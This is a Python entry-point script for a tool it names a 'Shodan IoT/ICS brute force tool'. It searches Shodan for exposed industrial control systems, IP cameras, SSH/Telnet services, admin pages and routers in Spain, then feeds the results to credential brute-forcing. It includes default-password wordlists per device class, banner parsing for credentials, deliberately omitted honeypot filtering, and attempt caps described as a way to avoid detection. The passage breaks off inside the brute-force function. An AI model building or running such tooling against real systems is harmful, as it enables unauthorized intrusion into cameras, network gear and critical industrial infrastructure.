"""Main entry point for the application."""

import argparse
from pathlib import Path
from shodan_analysis import run_basic_search, get_api_info
from brute_force import run_bruteforce
import yaml
import json
from datetime import datetime

AVAILABLE_QUERIES = {
    "1": "webcam",
    "2": "raspberrypi", 
    "3": "default-passwords",
    "4": "ics",
    "5": "advanced"  # Nueva opción
}

# Mapping for report names - CORREGIR las claves para que coincidan
REPORT_NAMES = {
    "webcam": "webcam_report.html",
    "raspberrypi": "raspberrypi_report.html",
    "default-passwords": "default_password_report.html",  # Cambiar aquí
    "ics": "ics_report.html"
}

# Consultas avanzadas mejoradas específicas para España (SIN HONEYPOTS, CON PRODUCTOS Y CATEGORÍAS)
ADVANCED_QUERIES_ES = {
    "1": 'country:"ES" product:"schneider","siemens","rockwell","ge"',
    "2": 'country:"ES" product:"modbus","ethernet/ip","profinet","bacnet"', 
    "3": 'country:"ES" product:"openssh","dropbear","telnet"',
    "4": 'country:"ES" product:"hikvision","dahua","axis","foscam","webcam"',
    "5": 'country:"ES" product:"apache","nginx","iis" http.title:"login","admin"',
    "6": 'country:"ES" product:"mikrotik","cisco","ubiquiti","tp-link"'
}

ADVANCED_QUERY_NAMES = {
    "1": "spain_ics_industrial_systems",
    "2": "spain_industrial_protocols", 
    "3": "spain_remote_access_services",
    "4": "spain_ip_cameras_surveillance",
    "5": "spain_web_admin_interfaces",
    "6": "spain_network_equipment"
}

ADVANCED_QUERY_DESCRIPTIONS = {
    "1": "Sistemas industriales ICS/SCADA de fabricantes principales (Schneider, Siemens, Rockwell, GE)",
    "2": "Protocolos industriales específicos (Modbus, EtherNet/IP, Profinet, BACnet)",
    "3": "Servicios de acceso remoto (OpenSSH, Dropbear, Telnet) sin capturas de pantalla",
    "4": "Cámaras IP y sistemas de vigilancia (Hikvision, Dahua, Axis, Foscam)",
    "5": "Interfaces web de administración (Apache, Nginx, IIS) con páginas de login",
    "6": "Equipos de red (MikroTik, Cisco, Ubiquiti, TP-Link)"
}

# Opciones de límite de resultados (ACTUALIZADO)
RESULT_LIMITS = {
    "1": 100,
    "2": 300, 
    "3": 500,
    "4": "custom"
}

# Costo estimado en créditos de Shodan para cada consulta (ACTUALIZADO)
ADVANCED_QUERY_CREDITS = {
    "1": 1,  # ICS específico por fabricante
    "2": 1,  # Protocolos industriales específicos
    "3": 1,  # SSH/Telnet sin screenshots
    "4": 1,  # Cámaras IP por fabricante
    "5": 2,  # Web admin interfaces (más costoso)
    "6": 1   # Network equipment por fabricante
}

def estimate_credits_by_limit(limit):
    """Estimate Shodan credits based on result limit."""
    if limit <= 100:
        return 0  # Primeros 100 resultados gratis
    else:
        # Cada 100 resultados adicionales = +1 crédito
        additional_credits = (limit - 100 + 99) // 100  # Redondeo hacia arriba
        return additional_credits

def calculate_total_cost(query_selection, result_limit):
    """Calculate total cost for a query including base cost and limit cost."""
    base_cost = ADVANCED_QUERY_CREDITS.get(query_selection, 1)
    limit_cost = estimate_credits_by_limit(result_limit)
    total_cost = base_cost + limit_cost
    return total_cost, base_cost, limit_cost

def analyze_banner_for_credentials(banner, product=""):
    """Analyze banner for potential credentials and security info."""
    if not banner:
        return {}
    
    banner_lower = banner.lower()
    findings = {
        'potential_credentials': [],
        'login_paths': [],
        'default_configs': [],
        'security_issues': [],
        'device_info': []
    }
    
    # Common default credentials patterns in banners
    default_creds_patterns = [
        ('admin', 'admin'), ('admin', 'password'), ('admin', ''),
        ('root', 'root'), ('root', 'password'), ('root', ''),
        ('user', 'user'), ('user', 'password'), ('user', ''),
        ('admin', '12345'), ('admin', '123456'),
        ('guest', 'guest'), ('guest', ''),
        ('support', 'support'), ('service', 'service'),
        ('operator', 'operator'), ('manager', 'manager'),
        ('pi', 'raspberry'), ('raspberry', 'pi'),
        ('ubnt', 'ubnt'), ('camera', 'camera'),
        ('dvr', 'dvr'), ('nvr', 'nvr')
    ]
    
    # Look for explicit credential mentions
    for username, password in default_creds_patterns:
        if f"{username}" in banner_lower and f"{password}" in banner_lower:
            findings['potential_credentials'].append(f"{username}:{password}")
        elif f"user: {username}" in banner_lower or f"username: {username}" in banner_lower:
            findings['potential_credentials'].append(f"{username}:?")
        elif f"pass: {password}" in banner_lower or f"password: {password}" in banner_lower:
            findings['potential_credentials'].append(f"?:{password}")
    
    # Common login paths and endpoints
    login_indicators = [
        '/login', '/admin', '/administrator', '/manager',
        '/user', '/guest', '/support', '/service',
        '/cgi-bin', '/web', '/webui', '/ui',
        '/index.html', '/home.html', '/main.html',
        '/camera.html', '/viewer.html', '/live.html',
        'login.php', 'admin.php', 'index.php',
        'login.asp', 'admin.asp', 'index.asp',
        'login.cgi', 'admin.cgi'
    ]
    
    for path in login_indicators:
        if path in banner_lower:
            findings['login_paths'].append(path)
    
    # Default configuration indicators
    default_config_patterns = [
        'default password', 'default login', 'default user',
        'factory default', 'initial password', 'setup password',
        'configuration required', 'first time setup',
        'change default password', 'please change password'
    ]
    
    for pattern in default_config_patterns:
        if pattern in banner_lower:
            findings['default_configs'].append(pattern)
    
    # Security issues
    security_patterns = [
        'no authentication', 'authentication disabled',
        'open access', 'public access', 'anonymous access',
        'weak password', 'blank password', 'empty password',
        'telnet enabled', 'ssh enabled', 'ftp enabled',
        'debug mode', 'test mode', 'demo mode'
    ]
    
    for pattern in security_patterns:
        if pattern in banner_lower:
            findings['security_issues'].append(pattern)
    
    # Device-specific information
    device_patterns = [
        'camera', 'webcam', 'ipcam', 'dvr', 'nvr',
        'router', 'switch', 'modem', 'gateway',
        'raspberry pi', 'arduino', 'iot device',
        'smart home', 'home automation',
        'printer', 'scanner', 'nas', 'storage'
    ]
    
    for pattern in device_patterns:
        if pattern in banner_lower:
            findings['device_info'].append(pattern)
    
    # Version and model extraction
    import re
    version_patterns = [
        r'version\s*[\:=]\s*([0-9]+\.[0-9]+(?:\.[0-9]+)?)',
        r'v([0-9]+\.[0-9]+(?:\.[0-9]+)?)',
        r'firmware\s*[\:=]\s*([0-9]+\.[0-9]+(?:\.[0-9]+)?)'
    ]
    
    for pattern in version_patterns:
        matches = re.findall(pattern, banner_lower)
        for match in matches:
            findings['device_info'].append(f"version: {match}")
    
    return findings

def save_results_to_json(results, targets, query_name, cost_info=None):
    """Save Shodan results to JSON file."""
    # Create json_data directory
    json_dir = Path(__file__).resolve().parents[1] / "json_data"
    json_dir.mkdir(exist_ok=True)
    
    # Generate filename with date
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{query_name}_{timestamp}.json"
    filepath = json_dir / filename
    
    # Determine if it's an advanced query
    is_advanced = query_name in ADVANCED_QUERY_NAMES.values()
    
    # Prepare data to save
    data = {
        "query_info": {
            "query_name": query_name,
            "timestamp": timestamp,
            "total_devices": len(targets),
            "query_date": datetime.now().isoformat(),
            "query_type": "advanced" if is_advanced else "basic"
        },
        "results": results,
        "targets": targets
    }
    
    # Add cost information
    if cost_info:
        data["query_info"]["cost_breakdown"] = cost_info
        data["query_info"]["estimated_credits_used"] = f"{cost_info['total_cost']} crédito{'s' if cost_info['total_cost'] > 1 else ''}"
    else:
        data["query_info"]["estimated_credits_used"] = "0 (free)" if not is_advanced else "Unknown"
    
    # Add description and query string based on type
    if is_advanced:
        # Find the query key for advanced queries
        query_key = None
        for k, name in ADVANCED_QUERY_NAMES.items():
            if name == query_name:
                query_key = k
                break
        
        if query_key:
            data["query_info"]["description"] = ADVANCED_QUERY_DESCRIPTIONS.get(query_key, "")
            data["query_info"]["query_string"] = ADVANCED_QUERIES_ES.get(query_key, "")
        else:
            data["query_info"]["description"] = "Advanced query"
            data["query_info"]["query_string"] = "Unknown"
    else:
        # For basic queries, use the query name as description
        basic_descriptions = {
            "webcam": "Basic webcam search - web cameras and surveillance systems",
            "raspberrypi": "Basic Raspberry Pi search - IoT devices and embedded systems", 
            "default-passwords": "Basic default password search - devices with weak authentication",
            "ics": "Basic ICS search - industrial control systems and SCADA"
        }
        data["query_info"]["description"] = basic_descriptions.get(query_name, f"Basic search for {query_name}")
        data["query_info"]["query_string"] = query_name
    
    # Save to JSON
    with open(filepath, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False, default=str)
    
    print(f"✅ Results saved to: {filepath}")
    return str(filepath)

def load_results_from_json():
    """Load previous Shodan results from JSON file."""
    json_dir = Path(__file__).resolve().parents[1] / "json_data"
    
    if not json_dir.exists():
        print("❌ No previous results found. json_data directory doesn't exist.")
        return None, None
    
    # Get all JSON files
    json_files = list(json_dir.glob("*.json"))
    
    if not json_files:
        print("❌ No previous results found. No JSON files in json_data directory.")
        return None, None
    
    # Sort by modification time (newest first)
    json_files.sort(key=lambda x: x.stat().st_mtime, reverse=True)
    
    print("\n=== Previous Shodan Results ===")
    for i, file in enumerate(json_files[:10], 1):  # Show last 10 files
        try:
            with open(file, 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            query_info = data.get("query_info", {})
            query_name = query_info.get("query_name", "unknown")
            timestamp = query_info.get("timestamp", "unknown")
            total_devices = query_info.get("total_devices", 0)
            description = query_info.get("description", "")
            credits_used = query_info.get("estimated_credits_used", "Unknown")
            query_type = query_info.get("query_type", "unknown")
            
            # Add type indicator
            type_icon = "🆓" if query_type == "basic" else "💳"
            
            print(f"{i}. {type_icon} {query_name}")
            print(f"   📅 {timestamp} | 📱 {total_devices} devices | 💰 {credits_used}")
            if description:
                print(f"   📝 {description}")
            print()
        except Exception as e:
            print(f"{i}. {file.name} - Error reading file: {e}")
    
    # Get user selection
    while True:
        try:
            choice = int(input(f"Select file to load (1-{min(10, len(json_files))}): "))
            if 1 <= choice <= min(10, len(json_files)):
                selected_file = json_files[choice - 1]
                break
            else:
                print(f"Invalid choice. Please select 1-{min(10, len(json_files))}")
        except ValueError:
            print("Invalid input. Please enter a number.")
    
    # Load selected file
    try:
        with open(selected_file, 'r', encoding='utf-8') as f:
            data = json.load(f)
        
        results = data.get("results", [])
        targets = data.get("targets", [])
        query_info = data.get("query_info", {})
        
        query_type = query_info.get("query_type", "unknown")
        type_indicator = "🆓 Basic" if query_type == "basic" else "💳 Advanced"
        
        print(f"✅ Loaded: {type_indicator} - {query_info.get('query_name', 'unknown')} with {len(targets)} devices")
        print(f"📝 Description: {query_info.get('description', 'N/A')}")
        print(f"💰 Credits cost: {query_info.get('estimated_credits_used', 'Unknown')}")
        return results, targets
        
    except Exception as e:
        print(f"❌ Error loading file: {e}")
        return None, None

def main():
    """Main entry point."""
    # Create necessary directories
    base_dir = Path(__file__).resolve().parents[1]
    (base_dir / "json_data").mkdir(exist_ok=True)
    (base_dir / "reports").mkdir(exist_ok=True)
    
    # Load config
    config_path = base_dir / "config" / "config.yaml"
    with open(config_path) as f:
        config = yaml.safe_load(f)

    # Show main options
    print("\n=== SHODAN IoT/ICS BRUTE FORCE TOOL ===")
    print("1. Run basic queries (free) 🆓")
    print("2. Run advanced queries for Spain (uses credits) 💳")
    print("3. Load previous results and attack 📂")
    
    # Get main selection
    while True:
        main_choice = input("\nSelect option (1-3): ")
        if main_choice in ["1", "2", "3"]:
            break
        print("Invalid selection. Please choose 1-3")
    
    if main_choice == "1":
        run_basic_queries(config)
    elif main_choice == "2":
        run_advanced_queries(config)
    elif main_choice == "3":
        run_from_previous_results()

def get_result_limit():
    """Allow user to select result limit for basic queries (FREE)."""
    print("\n📊 RESULT LIMIT SELECTION")
    print("="*40)
    print("🆓 Consultas básicas son GRATUITAS independientemente del límite")
    print("💡 Recomendado: 100-300 para pruebas, 500+ para análisis completo")
    print()
    
    for key, limit in RESULT_LIMITS.items():
        if limit == "custom":
            print(f"{key}. Custom limit (you specify)")
        else:
            print(f"{key}. {limit} results (🆓 Free)")
    print()
    
    # Get user selection
    while True:
        selection = input(f"Select result limit (1-{len(RESULT_LIMITS)}): ")
        if selection in RESULT_LIMITS:
            if RESULT_LIMITS[selection] == "custom":
                while True:
                    try:
                        custom_limit = int(input("Enter custom limit (1-1000): "))
                        if 1 <= custom_limit <= 1000:
                            print(f"🆓 Selected: {custom_limit} results (Free)")
                            return custom_limit
                        else:
                            print("Invalid range. Please enter 1-1000")
                    except ValueError:
                        print("Invalid input. Please enter a number.")
            else:
                selected_limit = RESULT_LIMITS[selection]
                print(f"🆓 Selected: {selected_limit} results (Free)")
                return selected_limit
        else:
            print(f"Invalid selection. Please choose 1-{len(RESULT_LIMITS)}")

def get_result_limit_advanced(query_selection):
    """Allow user to select result limit for advanced queries with detailed cost info."""
    print("\n📊 RESULT LIMIT SELECTION")
    print("="*50)
    print("💡 Costo por límite de resultados:")
    print("   🆓 Hasta 100 resultados: Gratis")
    print("   💳 101-200 resultados: +1 crédito")
    print("   💳 201-300 resultados: +2 créditos")
    print("   💳 301-400 resultados: +3 créditos")
    print("   💳 401-500 resultados: +4 créditos")
    print("   💳 500+ resultados: +1 crédito por cada 100 adicionales")
    print()
    
    base_cost = ADVANCED_QUERY_CREDITS.get(query_selection, 1)
    
    for key, limit in RESULT_LIMITS.items():
        if limit == "custom":
            print(f"{key}. Custom limit (you specify)")
        else:
            limit_cost = estimate_credits_by_limit(limit)
            total_cost = base_cost + limit_cost
            if limit_cost == 0:
                cost_display = f"💳 {base_cost} crédito{'s' if base_cost > 1 else ''} (base only)"
            else:
                cost_display = f"💳 {total_cost} crédito{'s' if total_cost > 1 else ''} ({base_cost} base + {limit_cost} limit)"
            print(f"{key}. {limit} results ({cost_display})")
    print()
    
    # Get user selection
    while True:
        selection = input(f"Select result limit (1-{len(RESULT_LIMITS)}): ")
        if selection in RESULT_LIMITS:
            if RESULT_LIMITS[selection] == "custom":
                while True:
                    try:
                        custom_limit = int(input("Enter custom limit (1-1000): "))
                        if 1 <= custom_limit <= 1000:
                            limit_cost = estimate_credits_by_limit(custom_limit)
                            total_cost = base_cost + limit_cost
                            if limit_cost == 0:
                                cost_display = f"{base_cost} crédito{'s' if base_cost > 1 else ''} (base only)"
                            else:
                                cost_display = f"{total_cost} crédito{'s' if total_cost > 1 else ''} ({base_cost} base + {limit_cost} limit)"
                            print(f"💳 Total cost for {custom_limit} results: {cost_display}")
                            return custom_limit
                        else:
                            print("Invalid range. Please enter 1-1000")
                    except ValueError:
                        print("Invalid input. Please enter a number.")
            else:
                selected_limit = RESULT_LIMITS[selection]
                limit_cost = estimate_credits_by_limit(selected_limit)
                total_cost = base_cost + limit_cost
                if limit_cost == 0:
                    cost_display = f"{base_cost} crédito{'s' if base_cost > 1 else ''} (base only)"
                else:
                    cost_display = f"{total_cost} crédito{'s' if total_cost > 1 else ''} ({base_cost} base + {limit_cost} limit)"
                print(f"💳 Total cost for {selected_limit} results: {cost_display}")
                return selected_limit
        else:
            print(f"Invalid selection. Please choose 1-{len(RESULT_LIMITS)}")

def run_basic_queries(config):
    """Run basic Shodan queries."""
    print("\n=== Basic Shodan Queries (Free) ===")
    print("💡 Estas consultas utilizan los límites de búsqueda gratuita de Shodan")
    print("💾 Los resultados se guardarán automáticamente en JSON para análisis futuro")
    print()
    
    basic_queries = {k: v for k, v in AVAILABLE_QUERIES.items() if k != "5"}
    for key, query in basic_queries.items():
        # Add descriptions for basic queries
        descriptions = {
            "1": "Web cameras and surveillance devices",
            "2": "Raspberry Pi and IoT devices", 
            "3": "Devices with default/weak passwords",
            "4": "Industrial Control Systems (ICS/SCADA)"
        }
        description = descriptions.get(key, "")
        print(f"{key}. {query}")
        if description:
            print(f"   📝 {description}")
        print()
    
    # Get user selection
    while True:
        selection = input(f"Select query (1-4): ")
        if selection in basic_queries:
            break
        print("Invalid selection. Please choose 1-4")
    
    selected_query = basic_queries[selection]
    
    # NUEVO: Seleccionar límite de resultados para consultas básicas también
    result_limit = get_result_limit()
    
    print(f"\n🎯 Running basic search for: {selected_query}")
    print(f"📊 Result limit: {result_limit}")
    print(f"💰 Cost: Free (uses Shodan's basic search limits)")
    
    # Run the original main() flow for basic queries
    execute_original_flow(selected_query, config, result_limit)

def run_advanced_queries(config):
    """Run advanced Shodan queries for Spain."""
    print("\n=== Advanced Shodan Queries for Spain (Uses Credits) ===")
    print("🎯 Consultas especializadas optimizadas con filtros de producto y categoría")
    print("🚫 Sin filtros de honeypot - resultados más limpios")
    print("💡 Consultas mejoradas con fabricantes y productos específicos")
    print("💾 Los resultados se guardarán automáticamente en JSON para análisis futuro")
    print()
    
    for key, query in ADVANCED_QUERIES_ES.items():
        query_name = ADVANCED_QUERY_NAMES[key]
        description = ADVANCED_QUERY_DESCRIPTIONS[key]
        base_credits = ADVANCED_QUERY_CREDITS[key]
        
        print(f"{key}. {query_name}")
        print(f"   📝 {description}")
        print(f"   💳 Base cost: {base_credits} crédito{'s' if base_credits > 1 else ''}")
        print(f'   🔍 Query: "{query}"')
        print()
    
    # Get user selection
    while True:
        selection = input(f"Select advanced query (1-{len(ADVANCED_QUERIES_ES)}): ")
        if selection in ADVANCED_QUERIES_ES:
            break
        print(f"Invalid selection. Please choose 1-{len(ADVANCED_QUERIES_ES)}")
    
    selected_query = ADVANCED_QUERIES_ES[selection]
    query_name = ADVANCED_QUERY_NAMES[selection]
    description = ADVANCED_QUERY_DESCRIPTIONS[selection]
    base_credits = ADVANCED_QUERY_CREDITS[selection]
    
    print(f"\n🎯 Selected: {query_name}")
    print(f"📝 Description: {description}")
    print(f"💳 Base cost: {base_credits} crédito{'s' if base_credits > 1 else ''}")
    print(f'🔍 Query: "{selected_query}"')
    
    # NUEVO: Seleccionar límite de resultados con costo detallado
    result_limit = get_result_limit_advanced(selection)
    
    # Calculate total cost
    total_cost, base_cost, limit_cost = calculate_total_cost(selection, result_limit)
    
    print(f"\n📊 Query configuration:")
    print(f"   🔍 Search query: \"{selected_query}\"")
    print(f"   📊 Result limit: {result_limit}")
    print(f"💰 Cost breakdown:")
    print(f"   🔹 Base query cost: {base_cost} crédito{'s' if base_cost > 1 else ''}")
    print(f"   🔹 Result limit cost: {limit_cost} crédito{'s' if limit_cost > 1 else ''} (for {result_limit} results)")
    print(f"   🔹 Total cost: {total_cost} crédito{'s' if total_cost > 1 else ''}")
    
    # Show current credits and confirm
    credits_info = get_api_info(config["shodan_api_key"])
    current_credits = credits_info['credits_remaining']
    
    print(f"\n💳 Current Shodan credits: {current_credits}")
    
    if total_cost > current_credits:
        print(f"❌ Insufficient credits! You need {total_cost} but only have {current_credits}")
        return
    
    confirm = input(f"\n❓ This query will cost {total_cost} crédito{'s' if total_cost > 1 else ''}. Continue? (y/n): ")
    if confirm.lower() != 'y':
        print("🚫 Search cancelled.")
        return
    
    # Execute advanced query and save to JSON
    execute_advanced_flow(selected_query, query_name, config, result_limit)

def execute_original_flow(selected_query, config, result_limit=None):
    """Execute the original main() flow for basic queries."""
    # Create reports directory if it doesn't exist
    reports_dir = Path(__file__).resolve().parents[1] / "reports"
    reports_dir.mkdir(exist_ok=True)
    
    # Generate output path with specific name
    report_filename = REPORT_NAMES[selected_query]
    output_path = reports_dir / report_filename
    
    print(f"\n🔍 Executing Shodan search...")
    print(f"📄 Report will be saved to: {output_path}")
    if result_limit:
        print(f"📊 Result limit: {result_limit}")
    
    # CORREGIDO: No añadir limit al query, pasarlo como parámetro
    search_query = selected_query
    
    # Run basic search and generate report (PASAR result_limit como parámetro separado)
    results, targets = run_basic_search(search_query, str(output_path), config["shodan_api_key"], limit=result_limit)

    # Show results
    if results:
        print(f"\n✅ Search completed!")
        print(f"📱 Devices found: {len(targets)}")
        print(f"📄 Report generated: {output_path}")
        
        # NUEVO: Guardar también en JSON para consultas básicas
        json_path = save_results_to_json(results, targets, selected_query)
        print(f"💾 Results saved to JSON for future analysis")
        
    else:
        print("❌ No devices found.")
        return

    # Show available credits
    credits_info = get_api_info(config["shodan_api_key"])
    print(f"💳 Shodan credits remaining: {credits_info['credits_remaining']}")

    # Continue with original brute force flow
    execute_original_brute_force_flow(targets)

def execute_advanced_flow(query, query_name, config, result_limit):
    """Execute advanced query flow with JSON saving."""
    # Calculate cost information
    query_key = None
    for k, name in ADVANCED_QUERY_NAMES.items():
        if name == query_name:
            query_key = k
            break
    
    if query_key:
        total_cost, base_cost, limit_cost = calculate_total_cost(query_key, result_limit)
        cost_info = {
            "base_cost": base_cost,
            "limit_cost": limit_cost,
            "total_cost": total_cost,
            "result_limit": result_limit
        }
    else:
        cost_info = None
    
    # Create reports directory
    reports_dir = Path(__file__).resolve().parents[1] / "reports"
    reports_dir.mkdir(exist_ok=True)
    
    # Generate output path
    report_filename = f"{query_name}_report.html"
    output_path = reports_dir / report_filename
    
    print(f"\n🔍 Executing Shodan search...")
    print(f"📄 Report will be saved to: {output_path}")
    print(f"📊 Result limit: {result_limit}")
    
    # CORREGIDO: No añadir limit al query, pasarlo como parámetro
    # Run search (PASAR result_limit como parámetro separado)
    results, targets = run_basic_search(query, str(output_path), config["shodan_api_key"], limit=result_limit)
    
    if not results or not targets:
        print("❌ No devices found.")
        return
    
    # Save to JSON with cost info
    json_path = save_results_to_json(results, targets, query_name, cost_info)
    
    # Show results summary
    print(f"\n✅ Search completed!")
    print(f"📱 Devices found: {len(targets)}")
    print(f"📊 Results limited to: {result_limit}")
    if cost_info:
        print(f"💰 Actual cost: {cost_info['total_cost']} crédito{'s' if cost_info['total_cost'] > 1 else ''}")
    print(f"📄 Report generated: {output_path}")
    print(f"💾 Results saved to JSON for future use without credit cost")
    
    # Show credits after search
    credits_info = get_api_info(config["shodan_api_key"])
    print(f"💳 Shodan credits remaining: {credits_info['credits_remaining']}")
    
    # Continue with original brute force flow
    execute_original_brute_force_flow(targets)

# NUEVO: Sistema de wordlists personalizados
WORDLISTS = {
    "1": {
        "name": "General IoT/Default",
        "description": "Credenciales comunes para dispositivos IoT y sistemas generales",
        "usernames": ["admin", "root", "user", "guest", "administrator", "support", "service", "operator"],
        "passwords": ["admin", "password", "123456", "12345", "root", "user", "guest", "", "default", "1234"]
    },
    "2": {
        "name": "ICS/SCADA Systems",
        "description": "Credenciales específicas para sistemas industriales y SCADA",
        "usernames": ["admin", "operator", "engineer", "supervisor", "maintenance", "service", "hmi", "scada", "plc"],
        "passwords": ["admin", "operator", "engineer", "1234", "password", "123456", "scada", "hmi", "siemens", "schneider"]
    },
    "3": {
        "name": "IP Cameras/Surveillance",
        "description": "Credenciales específicas para cámaras IP y sistemas de vigilancia",
        "usernames": ["admin", "viewer", "guest", "camera", "user", "operator", "root", "manager"],
        "passwords": ["admin", "camera", "viewer", "123456", "password", "888888", "000000", "12345", "dvr", "nvr"]
    },
    "4": {
        "name": "Remote Access (SSH/Telnet/FTP)",
        "description": "Credenciales para servicios de acceso remoto",
        "usernames": ["admin", "root", "user", "guest", "pi", "raspberry", "ubuntu", "debian", "centos"],
        "passwords": ["admin", "root", "password", "raspberry", "pi", "123456", "12345", "toor", "ubuntu", ""]
    },
    "5": {
        "name": "Network Equipment",
        "description": "Credenciales para routers, switches y equipos de red",
        "usernames": ["admin", "root", "user", "guest", "cisco", "ubnt", "mikrotik", "tp-link"],
        "passwords": ["admin", "password", "cisco", "ubnt", "123456", "12345", "router", "switch", "1234", ""]
    }
}

def select_wordlist():
    """Allow user to select a wordlist for brute force attacks."""
    print("\n" + "="*60)
    print("WORDLIST SELECTION")
    print("="*60)
    print("📝 Selecciona el wordlist más apropiado para tus objetivos:")
    print("⚠️  Recuerda: Máximo 100 combinaciones para evitar detección")
    print()
    
    # Display wordlist options
    for key, wordlist in WORDLISTS.items():
        name = wordlist["name"]
        description = wordlist["description"]
        username_count = len(wordlist["usernames"])
        password_count = len(wordlist["passwords"])
        total_combinations = username_count * password_count
        
        print(f"{key}. {name}")
        print(f"   📝 {description}")
        print(f"   👤 {username_count} usernames | 🔑 {password_count} passwords | 🎯 {total_combinations} combinations")
        
        # Show status based on combination count
        if total_combinations <= 50:
            print(f"   ✅ Conservative approach - Low detection risk")
        elif total_combinations <= 80:
            print(f"   ⚠️  Moderate approach - Medium detection risk")
        elif total_combinations <= 100:
            print(f"   🚨 Aggressive approach - Higher detection risk")
        else:
            print(f"   ❌ TOO MANY combinations - Will be limited to 100")
        print()
    
    # Custom wordlist option
    print(f"{len(WORDLISTS) + 1}. Custom Wordlist")
    print(f"   📝 Define your own username and password lists")
    print(f"   ⚙️  Full control over combinations (max 100)")
    print()
    
    # Get user selection
    while True:
        try:
            selection = input(f"Select wordlist (1-{len(WORDLISTS) + 1}): ")
            if selection in WORDLISTS:
                selected_wordlist = WORDLISTS[selection]
                break
            elif selection == str(len(WORDLISTS) + 1):
                selected_wordlist = create_custom_wordlist()
                if selected_wordlist:
                    break
                else:
                    continue
            else:
                print(f"Invalid selection. Please choose 1-{len(WORDLISTS) + 1}")
        except ValueError:
            print("Invalid input. Please enter a number.")
    
    # Apply safety limit
    usernames = selected_wordlist["usernames"]
    passwords = selected_wordlist["passwords"]
    total_combinations = len(usernames) * len(passwords)
    
    if total_combinations > 100:
        print(f"\n⚠️  WARNING: {total_combinations} combinations exceed safety limit of 100")
        print("🔧 Applying automatic reduction...")
        
        # Reduce to stay under 100 combinations
        max_usernames = min(len(usernames), 10)  # Max 10 usernames
        max_passwords = min(100 // max_usernames, len(passwords))
        
        usernames = usernames[:max_usernames]
        passwords = passwords[:max_passwords]
        
        final_combinations = len(usernames) * len(passwords)
        print(f"✅ Reduced to: {len(usernames)} usernames × {len(passwords)} passwords = {final_combinations} combinations")
    
    print(f"\n🎯 Final wordlist: {selected_wordlist['name']}")
    print(f"👤 Usernames: {', '.join(usernames[:5])}" + ("..." if len(usernames) > 5 else ""))
    print(f"🔑 Passwords: {', '.join([p if p else '<blank>' for p in passwords[:5]])}" + ("..." if len(passwords) > 5 else ""))
    print(f"🎲 Total combinations: {len(usernames) * len(passwords)}")
    
    return usernames, passwords, selected_wordlist['name']

def create_custom_wordlist():
    """Create a custom wordlist interactively."""
    print("\n=== Custom Wordlist Creation ===")
    print("📝 Define your own username and password lists")
    print("⚠️  Remember: Total combinations should not exceed 100")
    print()
    
    # Get usernames
    print("👤 Enter usernames (separated by commas):")
    print("   Example: admin,root,user,guest")
    username_input = input("Usernames: ").strip()
    
    if not username_input:
        print("❌ No usernames provided. Returning to wordlist selection.")
        return None
    
    usernames = [u.strip() for u in username_input.split(',') if u.strip()]
    
    if len(usernames) > 20:
        print(f"⚠️  Too many usernames ({len(usernames)}). Limiting to first 20.")
        usernames = usernames[:20]
    
    # Get passwords
    print(f"\n🔑 Enter passwords (separated by commas):")
    print("   Example: password,123456,admin,<blank>")
    print("   Note: Use '<blank>' for empty password")
    password_input = input("Passwords: ").strip()
    
    if not password_input:
        print("❌ No passwords provided. Returning to wordlist selection.")
        return None
    
    passwords = []
    for p in password_input.split(','):
        p = p.strip()
        if p.lower() == '<blank>':
            passwords.append('')
        elif p:
            passwords.append(p)
    
    if len(passwords) > 20:
        print(f"⚠️  Too many passwords ({len(passwords)}). Limiting to first 20.")
        passwords = passwords[:20]
    
    # Check combination count
    total_combinations = len(usernames) * len(passwords)
    print(f"\n📊 Custom wordlist summary:")
    print(f"   👤 {len(usernames)} usernames")
    print(f"   🔑 {len(passwords)} passwords")
    print(f"   🎯 {total_combinations} total combinations")
    
    if total_combinations > 100:
        print(f"⚠️  WARNING: {total_combinations} combinations exceed recommended limit of 100")
        proceed = input("Continue anyway? (y/n): ")
        if proceed.lower() != 'y':
            return None
    
    return {
        "name": "Custom Wordlist",
        "description": "User-defined custom wordlist",
        "usernames": usernames,
        "passwords": passwords
    }

def show_wordlist_recommendations(targets):
    """Analyze targets and recommend best wordlist."""
    print("\n🤖 WORDLIST RECOMMENDATIONS")
    print("="*50)
    
    # Analyze target characteristics
    service_types = {}
    products = {}
    ports = {}
    
    for target in targets:
        # Service analysis
        port = target['port']
        if port in [502, 1911, 20000, 44818, 102, 2404]:
            service_types['ics'] = service_types.get('ics', 0) + 1
        elif port in [80, 443, 8080, 8443] and any(cam_term in target.get('product', '').lower() 
                                                   for cam_term in ['camera', 'webcam', 'dvr', 'nvr']):
            service_types['camera'] = service_types.get('camera', 0) + 1
        elif port in [22, 23, 21]:
            service_types['remote'] = service_types.get('remote', 0) + 1
        elif port in [80, 443, 8080, 8443]:
            service_types['web'] = service_types.get('web', 0) + 1
        
        # Product analysis
        product = target.get('product', 'Unknown').lower()
        if 'camera' in product or 'webcam' in product:
            products['camera'] = products.get('camera', 0) + 1
        elif any(term in product for term in ['scada', 'hmi', 'plc', 'modbus']):
            products['ics'] = products.get('ics', 0) + 1
        elif any(term in product for term in ['router', 'switch', 'gateway']):
            products['network'] = products.get('network', 0) + 1
    
    # Generate recommendations
    recommendations = []
    
    # ICS/SCADA systems
    ics_count = service_types.get('ics', 0) + products.get('ics', 0)
    if ics_count > 0:
        recommendations.append((2, f"🏭 ICS/SCADA Systems - {ics_count} devices detected"))
    
    # Cameras
    camera_count = service_types.get('camera', 0) + products.get('camera', 0)
    if camera_count > 0:
        recommendations.append((3, f"📹 IP Cameras - {camera_count} devices detected"))
    
    # Remote access
    remote_count = service_types.get('remote', 0)
    if remote_count > 0:
        recommendations.append((4, f"🔐 Remote Access - {remote_count} devices detected"))
    
    # Network equipment
    network_count = products.get('network', 0)
    if network_count > 0:
        recommendations.append((5, f"🌐 Network Equipment - {network_count} devices detected"))
    
    # Show recommendations
    if recommendations:
        print("Based on your targets, we recommend:")
        for wordlist_id, description in recommendations:
            wordlist_name = WORDLISTS[str(wordlist_id)]["name"]
            print(f"  • Wordlist {wordlist_id}: {wordlist_name}")
            print(f"    └─ {description}")
        print()
        print("💡 You can also use 'General IoT/Default' for mixed environments")
    else:
        print("📊 Mixed target environment detected")
        print("💡 Recommendation: Use 'General IoT/Default' wordlist")
    
    print("="*50)

def execute_original_brute_force_flow(targets):
    """Execute the original brute force flow (MANTIENE LA FUNCIONALIDAD ORIGINAL)."""
    
    # Show discovered devices
    print("\n" + "="*80)
    print("DISCOVERED DEVICES")
